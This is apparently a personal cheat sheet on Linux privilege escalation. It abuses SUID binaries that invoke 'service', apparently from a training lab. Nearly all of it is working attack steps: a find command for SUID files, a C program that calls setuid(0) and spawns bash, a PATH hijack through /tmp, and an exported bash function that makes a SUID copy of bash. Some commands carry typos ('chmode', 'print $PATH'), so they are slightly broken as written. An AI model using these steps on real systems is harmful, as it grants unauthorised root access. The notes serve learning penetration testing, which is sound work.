Escalation via Environmental Variables:
-Start an existant service but with modified PATH to become root
    see Environement Variables:
        env:
            ex: PATH,PWD,HOME,OLDPWD
        
        find / -type -f -perm -04000 -ls 2>/dev/null
            IF we find "suid-env":
                strings /usr/local/bin/suid-env:
                    "service apache2 start"
                print $PATH <--- This will display the full path where "service" comes from

            We will inject a code into the full PATH needed to invoke "service":
                echo 'int main() {setgid(0); setuid(0); system("/bin/bash"); return 0;}' > /tmp/service.c
                gcc /tmp/service.c -o /tmp/service

                export PATH=/tmp:$PATH
                print $PATH <--- We can see that "/tmp" is called first when the service is invoked
                
            Now we will see if we have by pass the PATH to become root:
                /usr/local/bin/suid-env
                whoami



            IF we find "suid-env2":
            strings /usr/local/bin/suid-env2:
                "usr/sbin/service apache2 start"
            print $PATH <--- This will display the full path where "service" comes from

            We will create a "malicious" function:
                function /usr/sbin/service() { cp /bin/bash /tmp && chmode +s /tmp/bash && /tmp/bash -p;}
                export -f /usr/sbin/service <-- export -f == refere to shell function


            Now we will see if we have by pass the PATH to become root:
                /usr/local/bin/suid-env2
                whoami
